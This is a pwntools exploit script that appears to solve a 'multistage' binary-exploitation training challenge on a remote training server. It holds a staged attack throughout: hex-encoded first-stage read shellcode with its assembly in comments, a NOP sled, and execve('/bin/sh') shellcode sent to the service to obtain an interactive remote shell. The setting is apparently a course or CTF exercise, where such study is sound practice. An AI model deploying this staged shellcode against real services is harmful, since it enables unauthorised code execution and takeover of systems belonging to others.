from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

#r = process("./multistage")

#gdb.attach(r, """
#	brva 0x1240
#	c
#	""")

#input("wait")



r = remote("bin.training.jinblack.it", 2003)

#Code of the multistage read...
#push 0x404070
#pop rsi
#push 0x0
#pop rax
#push 0x0
#pop rdi
#push 0x50
#pop rdx
#syscall
#It is a read with a larger buffer over the original buffer. I set it to be able to contain the shellcode + the necessary nops.

read_code = b"\x68\x70\x40\x40\x00\x5E\x6A\x00\x58\x6A\x00\x5F\x6A\x50\x5A\x0F\x05"

#Shellcode from the shellcode challenge + 19 nop to overwrite the readcode after its execution
shellcode = b"\x90"*18 + b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00"

r.recvuntil(b"What is your name?")

r.send(read_code + shellcode)

r.interactive()